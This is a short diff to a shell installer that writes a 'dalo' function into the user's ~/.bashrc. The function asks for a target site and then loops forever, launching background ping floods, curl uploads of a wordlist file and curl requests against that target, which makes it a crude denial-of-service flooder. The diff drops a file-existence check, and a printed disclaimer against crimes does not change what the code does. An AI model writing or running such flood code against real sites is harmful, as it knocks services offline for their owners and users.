@@ -120,15 +120,13 @@ fi
 ' >> ~/.bashrc
 echo '
 dalo(){
-if [ -f "wordlist.txt" ]; then
 echo "Insert your target. (DONT USE IN A DEVICE WITH LESS THAN 4GB RAM OR FOR CRIMES!)"
+echo "If you dont have wordlist.txt, Ctrl+C and run setwordlist, so you can use dalo."
 read site
 while true; do
 ping -c 1000000 $site &
 curl -k -L -T wordlist.txt $site &
 curl -k -L $site &
 done
-else 
-echo "Please download wordlist with setwordlist before using dalo."
 }
 ' >> ~/.bashrc
